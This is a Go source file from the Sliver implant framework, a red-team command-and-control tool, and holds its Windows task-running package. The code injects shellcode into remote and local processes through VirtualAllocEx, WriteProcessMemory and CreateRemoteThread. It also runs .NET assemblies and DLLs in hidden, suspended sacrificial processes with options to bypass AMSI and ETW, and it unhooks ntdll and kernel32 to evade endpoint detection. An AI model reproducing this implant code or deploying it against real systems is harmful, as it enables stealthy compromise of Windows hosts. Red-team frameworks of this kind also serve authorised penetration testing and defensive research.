//+build windows

package taskrunner

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"bytes"
	"encoding/binary"

	// {{if .Debug}}
	"log"
	// {{else}}{{end}}
	"os/exec"
	"runtime"
	"strings"
	"time"
	"unsafe"

	"syscall"
	// {{if .Evasion}}
	"github.com/bishopfox/sliver/sliver/evasion"
	"github.com/bishopfox/sliver/sliver/version"

	// {{end}}

	"github.com/bishopfox/sliver/sliver/syscalls"
	"golang.org/x/sys/windows"
)

const (
	PROCESS_ALL_ACCESS = windows.STANDARD_RIGHTS_REQUIRED | windows.SYNCHRONIZE | 0xfff
	STILL_ACTIVE       = 259
)

var (
	ntdllPath       = "C:\\Windows\\System32\\ntdll.dll" // We make this a var so the string obfuscator can refactor it
	kernel32dllPath = "C:\\Windows\\System32\\kernel32.dll"
	CurrentToken    windows.Token
)

func sysAlloc(size int, rwxPages bool) (uintptr, error) {
	perms := windows.PAGE_EXECUTE_READWRITE
	if !rwxPages {
		perms = windows.PAGE_READWRITE
	}
	n := uintptr(size)
	addr, err := windows.VirtualAlloc(uintptr(0), n, windows.MEM_RESERVE|windows.MEM_COMMIT, uint32(perms))
	if addr == 0 {
		return 0, err
	}
	return addr, nil
}

// injectTask - Injects shellcode into a process handle
func injectTask(processHandle windows.Handle, data []byte, rwxPages bool) error {
	var (
		err        error
		remoteAddr uintptr
	)
	dataSize := len(data)
	// Remotely allocate memory in the target process
	// {{if .Debug}}
	log.Println("allocating remote process memory ...")
	// {{end}}
	if rwxPages {
		remoteAddr, err = syscalls.VirtualAllocEx(processHandle, uintptr(0), uintptr(uint32(dataSize)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	} else {
		remoteAddr, err = syscalls.VirtualAllocEx(processHandle, uintptr(0), uintptr(uint32(dataSize)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	}
	// {{if .Debug}}
	log.Printf("virtualallocex returned: remoteAddr = %v, err = %v", remoteAddr, err)
	// {{end}}
	if err != nil {
		// {{if .Debug}}
		log.Println("[!] failed to allocate remote process memory")
		// {{end}}
		return err
	}

	// Write the shellcode into the remotely allocated buffer
	var nLength uintptr
	err = syscalls.WriteProcessMemory(processHandle, remoteAddr, &data[0], uintptr(uint32(dataSize)), &nLength)
	// {{if .Debug}}
	log.Printf("writeprocessmemory returned: err = %v", err)
	// {{end}}
	if err != nil {
		// {{if .Debug}}
		log.Printf("[!] failed to write data into remote process")
		// {{end}}
		return err
	}
	if !rwxPages {
		var oldProtect uint32
		// Set proper page permissions
		err = syscalls.VirtualProtectEx(processHandle, remoteAddr, uintptr(uint(dataSize)), windows.PAGE_EXECUTE_READ, &oldProtect)
		if err != nil {
			//{{if .Debug}}
			log.Println("VirtualProtectEx failed:", err)
			//{{end}}
			return err
		}
	}
	// Create the remote thread to where we wrote the shellcode
	// {{if .Debug}}
	log.Println("successfully injected data, starting remote thread ....")
	// {{end}}
	attr := new(windows.SecurityAttributes)
	var lpThreadId uint32
	_, err = syscalls.CreateRemoteThread(processHandle, attr, uint32(0), remoteAddr, 0, 0, &lpThreadId)
	// {{if .Debug}}
	log.Printf("createremotethread returned:  err = %v", err)
	// {{end}}
	if err != nil {
		// {{if .Debug}}
		log.Printf("[!] failed to create remote thread")
		// {{end}}
		return err
	}
	return nil
}

// RermoteTask - Injects Task into a processID using remote threads
func RemoteTask(processID int, data []byte, rwxPages bool) error {
	err := refresh()
	if err != nil {
		return err
	}
	processHandle, err := windows.OpenProcess(PROCESS_ALL_ACCESS, false, uint32(processID))
	if processHandle == 0 {
		return err
	}
	err = injectTask(processHandle, data, rwxPages)
	if err != nil {
		return err
	}
	return nil
}

func LocalTask(data []byte, rwxPages bool) error {
	var err error
	if runtime.GOARCH == "amd64" {
		err = refresh()
		if err != nil {
			return err
		}
	}
	size := len(data)
	addr, _ := sysAlloc(size, rwxPages)
	buf := (*[9999999]byte)(unsafe.Pointer(addr))
	for index := 0; index < size; index++ {
		buf[index] = data[index]
	}
	if !rwxPages {
		var oldProtect uint32
		err = windows.VirtualProtect(addr, uintptr(size), windows.PAGE_EXECUTE_READ, &oldProtect)
		if err != nil {
			//{{if .Debug}}
			log.Println("VirtualProtect failed:", err)
			//{{end}}
			return err
		}
	}
	// {{if .Debug}}
	log.Printf("creating local thread with start address: 0x%08x", addr)
	// {{end}}
	var lpThreadId uint32
	_, err = syscalls.CreateThread(nil, 0, addr, uintptr(0), 0, &lpThreadId)
	return err
}

func ExecuteAssembly(hostingDll, assembly []byte, process, params string, amsi bool, etw bool, offset uint32) (string, error) {
	assemblySizeArr := convertIntToByteArr(len(assembly))
	paramsSizeArr := convertIntToByteArr(len(params) + 1)
	err := refresh()
	if err != nil {
		return "", err
	}
	// {{if .Debug}}
	log.Println("[*] Assembly size:", len(assembly))
	log.Println("[*] Hosting dll size:", len(hostingDll))
	// {{end}}
	var stdoutBuf, stderrBuf bytes.Buffer
	cmd, err := startProcess(process, &stdoutBuf, &stderrBuf, true)
	if err != nil {
		//{{if .Debug}}
		log.Println("Could not start process:", process)
		//{{end}}
		return "", err
	}
	pid := cmd.Process.Pid
	// {{if .Debug}}
	log.Printf("[*] %s started, pid = %d\n", process, pid)
	// {{end}}
	handle, err := windows.OpenProcess(PROCESS_ALL_ACCESS, true, uint32(pid))
	if err != nil {
		return "", err
	}
	defer windows.CloseHandle(handle)
	hostingDllAddr, err := allocAndWrite(hostingDll, handle, uint32(len(hostingDll)))
	if err != nil {
		return "", err
	}
	// {{if .Debug}}
	log.Printf("[*] Hosting DLL reflectively injected at 0x%08x\n", hostingDllAddr)
	// {{end}}

	// 4 bytes Assembly Size
	// 4 bytes Params Size
	// 1 byte AMSI bool  0x00 no  0x01 yes
	// 1 byte ETW bool  0x00 no  0x01 yes
	// parameter bytes
	// assembly bytes
	payload := append(assemblySizeArr, paramsSizeArr...)
	if amsi {
		payload = append(payload, byte(1))
	} else {
		payload = append(payload, byte(0))
	}
	if etw {
		payload = append(payload, byte(1))
	} else {
		payload = append(payload, byte(0))
	}
	payload = append(payload, []byte(params)...)
	payload = append(payload, '\x00')
	payload = append(payload, assembly...)
	totalSize := uint32(len(payload))
	assemblyAddr, err := allocAndWrite(payload, handle, totalSize)
	if err != nil {
		return "", err
	}
	// {{if .Debug}}
	log.Printf("[*] Wrote %d bytes at 0x%08x\n", len(payload), assemblyAddr)
	// {{end}}
	threadHandle, err := protectAndExec(handle, hostingDllAddr, uintptr(hostingDllAddr)+uintptr(offset), assemblyAddr, uint32(len(hostingDll)))
	if err != nil {
		return "", err
	}
	// {{if .Debug}}
	log.Printf("[*] RemoteThread started. Waiting for execution to finish.\n")
	// {{end}}
	err = waitForCompletion(threadHandle)
	if err != nil {
		return "", err
	}
	err = cmd.Process.Kill()
	if err != nil {
		// {{if .Debug}}
		log.Println("Error kill: %v\n", err)
		// {{end}}
		return "", err
	}
	return stdoutBuf.String() + stderrBuf.String(), nil
}

func SpawnDll(procName string, data []byte, offset uint32, args string) (string, error) {
	err := refresh()
	if err != nil {
		return "", err
	}
	var stdoutBuff bytes.Buffer
	var stderrBuff bytes.Buffer
	// 1 - Start process
	cmd, err := startProcess(procName, &stdoutBuff, &stderrBuff, true)
	if err != nil {
		return "", err
	}
	pid := cmd.Process.Pid
	// {{if .Debug}}
	log.Printf("[*] %s started, pid = %d\n", procName, pid)
	// {{end}}
	handle, err := windows.OpenProcess(PROCESS_ALL_ACCESS, true, uint32(pid))
	if err != nil {
		return "", err
	}
	defer windows.CloseHandle(handle)
	dataAddr, err := allocAndWrite(data, handle, uint32(len(data)))
	argAddr := uintptr(0)
	if len(args) > 0 {
		//{{if .Debug}}
		log.Printf("Args: %s\n", args)
		//{{end}}
		argsArray := []byte(args)
		argAddr, err = allocAndWrite(argsArray, handle, uint32(len(argsArray)))
		if err != nil {
			return "", err
		}
	}
	//{{if .Debug}}
	log.Printf("[*] Args addr: 0x%08x\n", argAddr)
	//{{end}}
	startAddr := uintptr(dataAddr) + uintptr(offset)
	threadHandle, err := protectAndExec(handle, dataAddr, startAddr, argAddr, uint32(len(data)))
	if err != nil {
		return "", err
	}
	// {{if .Debug}}
	log.Printf("[*] RemoteThread started. Waiting for execution to finish.\n")
	// {{end}}

	err = waitForCompletion(threadHandle)
	if err != nil {
		return "", err
	}
	cmd.Process.Kill()
	return stdoutBuff.String() + stderrBuff.String(), nil
}

//SideLoad - Side load a binary as shellcode and returns its output
func Sideload(procName string, data []byte, args string) (string, error) {
	return SpawnDll(procName, data, 0, "")
}

// Util functions
func refresh() error {
	// Hotfix for #114
	// Somehow this fucks up everything on Windows 8.1
	// so we're skipping the RefreshPE calls.
	// {{if .Evasion}}
	if version.GetVersion() != "6.3 build 9600" {
		err := evasion.RefreshPE(ntdllPath)
		if err != nil {
			//{{if .Debug}}
			log.Printf("RefreshPE on ntdll failed: %v\n", err)
			//{{end}}
			return err
		}
		err = evasion.RefreshPE(kernel32dllPath)
		if err != nil {
			//{{if .Debug}}
			log.Printf("RefreshPE on kernel32 failed: %v\n", err)
			//{{end}}
			return err
		}
	}
	// {{end}}
	return nil
}

func startProcess(proc string, stdout *bytes.Buffer, stderr *bytes.Buffer, suspended bool) (*exec.Cmd, error) {
	cmd := exec.Command(proc)
	cmd.SysProcAttr = &windows.SysProcAttr{
		Token: syscall.Token(CurrentToken),
	}
	cmd.Stdout = stdout
	cmd.Stderr = stderr
	cmd.SysProcAttr = &windows.SysProcAttr{
		HideWindow: true,
	}
	if suspended {
		cmd.SysProcAttr.CreationFlags = windows.CREATE_SUSPENDED
	}
	err := cmd.Start()
	if err != nil {
		//{{if .Debug}}
		log.Println("Could not start process:", proc)
		//{{end}}
		return nil, err
	}
	return cmd, nil
}

func waitForCompletion(threadHandle windows.Handle) error {
	for {
		var code uint32
		err := syscalls.GetExitCodeThread(threadHandle, &code)
		// log.Println(code)
		if err != nil && !strings.Contains(err.Error(), "operation completed successfully") {
			// {{if .Debug}}
			log.Printf("[-] Error when waiting for remote thread to exit: %s\n", err.Error())
			// {{end}}
			return err
		}
		if code == STILL_ACTIVE {
			time.Sleep(time.Second)
		} else {
			break
		}
	}
	return nil
}

func allocAndWrite(data []byte, handle windows.Handle, size uint32) (dataAddr uintptr, err error) {
	// VirtualAllocEx to allocate a new memory segment into the target process
	dataAddr, err = syscalls.VirtualAllocEx(handle, uintptr(0), uintptr(size), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		return
	}
	// WriteProcessMemory to write the reflective loader into the process
	var nLength uintptr
	err = syscalls.WriteProcessMemory(handle, dataAddr, &data[0], uintptr(uint32(len(data))), &nLength)
	if err != nil {
		return
	}
	return
}

func protectAndExec(handle windows.Handle, startAddr uintptr, threadStartAddr uintptr, argAddr uintptr, dataLen uint32) (threadHandle windows.Handle, err error) {
	var oldProtect uint32
	err = syscalls.VirtualProtectEx(handle, startAddr, uintptr(dataLen), windows.PAGE_EXECUTE_READ, &oldProtect)
	if err != nil {
		//{{if .Debug}}
		log.Println("VirtualProtectEx failed:", err)
		//{{end}}
		return
	}
	attr := new(windows.SecurityAttributes)
	var lpThreadId uint32
	//{{if .Debug}}
	log.Printf("Starting thread at 0x%08x\n", startAddr)
	//{{end}}
	threadHandle, err = syscalls.CreateRemoteThread(handle, attr, 0, threadStartAddr, argAddr, 0, &lpThreadId)
	if err != nil {
		return
	}
	return
}

func convertIntToByteArr(num int) []byte {
	buff := make([]byte, 4)
	binary.LittleEndian.PutUint32(buff, uint32(num))
	return buff
}
